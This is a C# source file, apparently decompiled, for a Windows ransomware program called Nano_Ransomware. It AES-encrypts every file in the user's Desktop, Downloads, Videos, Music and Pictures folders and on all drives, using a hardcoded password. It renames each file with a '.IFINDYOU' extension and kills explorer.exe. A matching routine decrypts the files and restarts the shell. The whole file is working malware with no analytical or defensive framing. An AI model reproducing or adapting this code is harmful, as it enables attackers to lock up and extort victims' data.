using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Nano_Ransomware;

internal class Nano_Crypt
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Videos");
		string text3 = Path.Combine(environmentVariable, "Music");
		string text4 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile dec = new DecryptionFile();
		string password = "AOFIJFOINWFOIJNGOIJWNEGOIJkjo34ojnOKJN#OKJNFDOstrewijheg9iuwhg9uhh9wuhwruh9w0hwroihwr9huyw8hurhiIJ#oijn3oijnOIFN#)IUHBR#";
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				for (int j = 0; j < files.Length; j++)
				{
					try
					{
						dec.DecryptFile(files[j], password);
						File.Move(files[j], files[j].Replace(".IFINDYOU", ""));
					}
					catch (Exception)
					{
					}
				}
				for (int k = 0; k < files2.Length; k++)
				{
					try
					{
						dec.DecryptFile(files2[k], password);
						File.Move(files2[k], files2[k].Replace(".IFINDYOU", ""));
					}
					catch (Exception)
					{
					}
				}
				for (int l = 0; l < files3.Length; l++)
				{
					try
					{
						dec.DecryptFile(files3[l], password);
						File.Move(files3[l], files3[l].Replace(".IFINDYOU", ""));
					}
					catch (Exception)
					{
					}
				}
				for (int m = 0; m < files4.Length; m++)
				{
					try
					{
						dec.DecryptFile(files4[m], password);
						File.Move(files4[m], files4[m].Replace(".IFINDYOU", ""));
					}
					catch (Exception)
					{
					}
				}
				for (int n = 0; n < files5.Length; n++)
				{
					try
					{
						dec.DecryptFile(files5[n], password);
						File.Move(files5[n], files5[n].Replace(".IFINDYOU", ""));
					}
					catch (Exception)
					{
					}
				}
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					string[] files6 = Directory.GetFiles(driveInfo.Name, "*", SearchOption.AllDirectories);
					for (int num2 = 0; num2 < files6.Length; num2++)
					{
						try
						{
							dec.DecryptFile(files6[num2], password);
							File.Move(files6[num2], files6[num2].Replace(".IFINDYOU", ""));
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch (Exception)
			{
			}
		});
		thread.Start();
		File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\death.txt");
		Process[] processesByName = Process.GetProcessesByName("explorer");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
		Process.Start("C:\\Windows\\explorer.exe");
	}

	public static void Start()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Videos");
		string text3 = Path.Combine(environmentVariable, "Music");
		string text4 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "AOFIJFOINWFOIJNGOIJWNEGOIJkjo34ojnOKJN#OKJNFDOstrewijheg9iuwhg9uhh9wuhwruh9w0hwroihwr9huyw8hurhiIJ#oijn3oijnOIFN#)IUHBR#";
		try
		{
			List<string> list = new List<string>();
			list.Add("ENCRYTPION\n\n");
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					list.Add("Encrypted: " + files[i]);
					encryptionFile.EncryptFile(files[i], password);
					File.Move(files[i], files[i] + ".IFINDYOU");
				}
				catch (Exception)
				{
				}
			}
			for (int j = 0; j < files2.Length; j++)
			{
				try
				{
					list.Add("Encrypted: " + files2[j]);
					encryptionFile.EncryptFile(files2[j], password);
					File.Move(files2[j], files2[j] + ".IFINDYOU");
				}
				catch (Exception)
				{
				}
			}
			for (int k = 0; k < files3.Length; k++)
			{
				try
				{
					list.Add("Encrypted: " + files3[k]);
					encryptionFile.EncryptFile(files3[k], password);
					File.Move(files3[k], files3[k] + ".IFINDYOU");
				}
				catch (Exception)
				{
				}
			}
			for (int l = 0; l < files4.Length; l++)
			{
				try
				{
					list.Add("Encrypted: " + files4[l]);
					encryptionFile.EncryptFile(files4[l], password);
					File.Move(files4[l], files4[l] + ".IFINDYOU");
				}
				catch (Exception)
				{
				}
			}
			for (int m = 0; m < files5.Length; m++)
			{
				try
				{
					list.Add("Encrypted: " + files5[m]);
					encryptionFile.EncryptFile(files5[m], password);
					File.Move(files5[m], files5[m] + ".IFINDYOU");
				}
				catch (Exception)
				{
				}
			}
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				string[] files6 = Directory.GetFiles(driveInfo.Name, "*", SearchOption.AllDirectories);
				for (int num = 0; num < files6.Length; num++)
				{
					try
					{
						list.Add("Encrypted: " + files6[num]);
						encryptionFile.EncryptFile(files6[num], password);
						File.Move(files6[num], files6[num] + ".IFINDYOU");
					}
					catch (Exception)
					{
					}
				}
			}
			File.WriteAllLines("IFindyourFilescache.dat", list);
		}
		catch (Exception)
		{
		}
		Process[] processesByName = Process.GetProcessesByName("explorer");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}
}
